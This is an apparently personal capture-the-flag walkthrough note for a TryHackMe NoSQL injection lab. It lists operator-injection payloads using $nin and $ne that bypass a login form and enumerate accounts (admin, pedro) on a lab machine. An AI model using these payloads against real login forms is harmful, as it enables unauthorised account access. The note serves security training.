### 25-Mar-24-Mon

[TryHackMe | NoSQL injection Basics](https://tryhackme.com/r/room/nosqlinjectiontutorial)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/36585103-29cd-4bca-934e-d0e6e2ac2e10)

http://10.10.195.200/sekr3tPl4ce.php

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/0d56800a-04b3-4b88-b437-a8a9922d7770)

```
User:	admin
Password:	************
Full Name:	
email:	admin@nosql.int
```

```
user[$nin][]=admin&pass[$ne]=test&remember=on
```



```
user[$nin][]=admin&user[$nin][]=test&pass[$ne]=test&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/406c2334-d76a-4378-8ef3-2573f7efbbe5)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d457d48c-aafa-4502-92b4-6d7471cebbd6)

```
User:	pedro
Password:	************
Full Name:	
email:	pcollins@nosql.int
```

